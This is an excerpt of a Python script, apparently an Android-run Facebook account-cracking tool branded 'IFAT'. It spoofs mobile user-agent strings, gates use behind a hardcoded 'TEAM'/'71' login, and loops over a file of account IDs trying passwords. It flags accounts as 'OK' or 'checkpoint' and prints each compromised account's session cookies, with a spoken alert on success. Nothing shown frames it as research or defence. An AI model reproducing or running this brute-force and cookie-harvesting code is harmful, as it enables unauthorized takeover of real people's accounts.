...
ua = ["Mozilla/5.0 (iPad; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/15.0 Safari/605.1.15 AlohaBrowser/3.2.6",]
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36",]
ugen2=[]
ugen=[]
cokbrut=[]
...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mIFAT')
...
while attemps < 12345677901:
    ...
    if username == 'TEAM' and password == '71':
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/IFAT.txt  Etc...]')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#IFAT-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•IFAT-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
				...
				#IFAT-King
				print(f'\r\033[0;92m[IFAT-➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " IFAT,  Ok,  id"')
